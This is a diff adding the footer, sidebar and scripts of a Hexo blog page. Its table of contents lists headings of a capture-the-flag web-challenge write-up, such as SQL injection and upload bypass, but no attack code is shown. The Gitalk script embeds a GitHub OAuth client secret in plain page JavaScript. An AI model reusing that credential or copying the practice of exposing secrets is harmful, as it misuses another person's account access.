+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div id="gitalk-container">
+  </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.jpg" alt="xiangfengw">
+            
+              <p class="site-author-name" itemprop="name">xiangfengw</p>
+              <p class="site-description motion-element" itemprop="description">陪你看千帆 陪你等风雨</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#writeup"><span class="nav-number">2.</span> <span class="nav-text">writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-签到题"><span class="nav-number">2.1.</span> <span class="nav-text">1.签到题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-md5-collision"><span class="nav-number">2.2.</span> <span class="nav-text">2.md5 collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-签到2"><span class="nav-number">2.3.</span> <span class="nav-text">3.签到2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-这题不是web"><span class="nav-number">2.4.</span> <span class="nav-text">4.这题不是web</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-层层递进"><span class="nav-number">2.5.</span> <span class="nav-text">5.层层递进</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-AAencode"><span class="nav-number">2.6.</span> <span class="nav-text">6.AAencode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-单身二十年"><span class="nav-number">2.7.</span> <span class="nav-text">7.单身二十年</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-php-decode"><span class="nav-number">2.8.</span> <span class="nav-text">8.php decode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-文件包含"><span class="nav-number">2.9.</span> <span class="nav-text">9.文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-单身一百年也没用"><span class="nav-number">2.10.</span> <span class="nav-text">10.单身一百年也没用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Download"><span class="nav-number">2.11.</span> <span class="nav-text">11.Download~!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-COOKIE"><span class="nav-number">2.12.</span> <span class="nav-text">12.COOKIE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-MYSQL"><span class="nav-number">2.13.</span> <span class="nav-text">13.MYSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-GBK-Injection"><span class="nav-number">2.14.</span> <span class="nav-text">14.GBK Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-x00"><span class="nav-number">2.15.</span> <span class="nav-text">15./x00</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-bypass-again"><span class="nav-number">2.16.</span> <span class="nav-text">16.bypass again</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-变量覆盖"><span class="nav-number">2.17.</span> <span class="nav-text">17.变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-php是世界上最好的语言"><span class="nav-number">2.18.</span> <span class="nav-text">18.php是世界上最好的语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-伪装者"><span class="nav-number">2.19.</span> <span class="nav-text">19.伪装者</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-header"><span class="nav-number">2.20.</span> <span class="nav-text">20.header</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-上传绕过"><span class="nav-number">2.21.</span> <span class="nav-text">21.上传绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-SQL注入1"><span class="nav-number">2.22.</span> <span class="nav-text">22.SQL注入1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-pass-check"><span class="nav-number">2.23.</span> <span class="nav-text">23.pass check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24-起名字真难"><span class="nav-number">2.24.</span> <span class="nav-text">24.起名字真难</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25-密码重置"><span class="nav-number">2.25.</span> <span class="nav-text">25.密码重置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#26-php反序列化（暂时无法做）"><span class="nav-number">2.26.</span> <span class="nav-text">26.php反序列化（暂时无法做）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#27-SQL-Injection"><span class="nav-number">2.27.</span> <span class="nav-text">27.SQL Injection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28-综合题"><span class="nav-number">2.28.</span> <span class="nav-text">28.综合题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#29-system（暂时无法做）"><span class="nav-number">2.29.</span> <span class="nav-text">29.system（暂时无法做）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#30-SQL注入2"><span class="nav-number">2.30.</span> <span class="nav-text">30.SQL注入2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#31-综合题2"><span class="nav-number">2.31.</span> <span class="nav-text">31.综合题2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#32-密码重置2"><span class="nav-number">2.32.</span> <span class="nav-text">32.密码重置2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#33-file-get-contents"><span class="nav-number">2.33.</span> <span class="nav-text">33.file_get_contents</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#34-变量覆盖"><span class="nav-number">2.34.</span> <span class="nav-text">34.变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#35-HateIT"><span class="nav-number">2.35.</span> <span class="nav-text">35. HateIT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#36-Anonymous"><span class="nav-number">2.36.</span> <span class="nav-text">36. Anonymous</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">4.</span> <span class="nav-text">Reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiangfengw</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'a577580d9583cf2d0777',
+          clientSecret: '5d26d41d6f828490c65bdd37e68234db18ad7d08',
+          repo: 'xiangfengwGitalk.github.io',
+          owner: 'xiangfengw',
+          admin: ['xiangfengw'],
+          id: md5(window.location.pathname),
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')
+       </script>
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
